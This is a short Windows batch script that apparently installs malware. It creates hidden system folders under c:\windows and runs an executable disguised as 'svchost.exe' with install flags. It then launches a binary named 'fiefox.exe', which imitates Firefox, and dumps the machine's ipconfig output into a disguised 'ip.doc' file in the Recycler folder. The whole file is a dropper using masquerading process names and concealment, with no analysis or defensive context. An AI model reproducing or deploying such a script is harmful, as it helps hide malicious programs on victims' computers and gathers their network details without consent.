@ echo off
@ md c:\windows\up
@ md c:\windows\down\
@ attrib +s +h c:\windows\down
@ attrib +s +h c:\windows\up
@ c:\windows\up\svchost.exe -r
@ c:\windows\up\svchost.exe -i
@ move /y c:\windows\up\fiefox.exe c:\windows\down
@ start c:\windows\down\fiefox.exe
@ ipconfig /all >> c:\Recycler\ip.doc   
@ exit